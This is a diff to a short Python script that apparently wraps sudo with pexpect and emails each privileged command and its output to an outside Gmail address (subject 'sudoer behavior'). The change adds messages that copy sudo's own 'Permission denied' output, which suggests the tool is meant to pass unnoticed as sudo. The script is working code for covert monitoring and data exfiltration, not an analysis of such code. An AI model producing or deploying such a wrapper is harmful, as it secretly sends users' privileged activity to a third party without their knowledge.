@@ -1,6 +1,5 @@
 #! /bin/env python
-from pexpect import *
-from sys import argv
+import sys
 from os import environ,system
 import smtplib
 from getpass import getpass
@@ -43,11 +42,18 @@ def sendemail(mssg):
     smtpserver.close()
 
 if __name__=="__main__":
-    comm=' '.join(argv[1:])
+    try:
+        from pexpect import *
+    except:
+        print >>sys.stderr,'Permission denied'
+        sys.exit()
+    comm=' '.join(sys.argv[1:])
     try:
         dsd=dosudo(comm)
 #        if dsd[0]: system('mail -s "sudoer behavior" dehllloorw@gmail.com <<EOF\n{0}\n{1}\nEOF'.format(dsd[0],("output: "+dsd[1]) if dsd[1] else ''))
         if dsd[0]: sendemail('{0}\n{1}'.format(dsd[0],("output: "+dsd[1]) if dsd[1] else ''))
-        if dsd[1]: print dsd[1]
+        if dsd[1]: 
+            if dsd[1]=='Permission denied': print >>sys.stderr, dsd[1]
+            else:print dsd[1]
     except:
         pass
